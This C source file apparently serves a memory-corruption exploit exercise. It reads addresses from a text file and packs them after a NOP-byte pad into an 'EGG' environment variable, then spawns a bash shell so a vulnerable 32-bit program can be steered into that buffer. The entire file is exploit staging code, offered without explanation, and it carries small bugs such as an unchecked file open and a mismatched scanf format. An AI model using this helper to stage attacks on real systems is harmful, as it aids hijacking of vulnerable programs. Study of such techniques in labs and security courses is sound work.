#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define NOP 0x90

int main(int argc, char **argv) {
    
    if (argc < 2) {
        printf("Padding size required.\n");
        exit(1);
    }

    int padding = atoi(argv[1]);
    FILE *fp = fopen("current_address_space.txt", "r");
    int lines = 0;
    int c;
    while ((c=fgetc(fp)) != EOF) {
        if (c == '\n')
            lines++;
    }
    // since addresses for 32-bit systems are 4 bytes in size
    char *buffer = malloc((4 + padding + (lines * 4)) * sizeof(char));
    memset(buffer, NOP, (4 + padding + (lines * 4)) * sizeof(char));
    memcpy(buffer, "EGG=", 4);
    int i = padding;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    long address;
    rewind(fp);
    while ((read = getline(&line, &len, fp)) != -1) {
        sscanf(line, "%x", &address);
        int shifts = 0;
        long shift = 0x000000ff;
        // printf("address: %010p\n", address);
        while (shifts < 4) {
            // printf("address & shift: %010p\n", (unsigned long) (address & shift) >> (shifts * 8));
            buffer[i++] = (unsigned long) (address & shift) >> (shifts * 8);
            shift = shift << 8;
            shifts++;
        }
    }
    buffer[i] = '\0';
    // print buffer for debugging
    /*for(i = 4; i < strlen(buffer); i+=4) {
        printf("0x%02x%02x%02x%02x\n", buffer[i] & 0xff, buffer[i + 1] & 0xff, buffer[i + 2] & 0xff, buffer[i + 3] & 0xff);
    }for(i = 0; i < strlen(buffer); i++) {
        printf("%c", buffer[i]);
    }*/
    putenv(buffer);
    system("/bin/bash");

    fclose(fp);
    return 0;
}    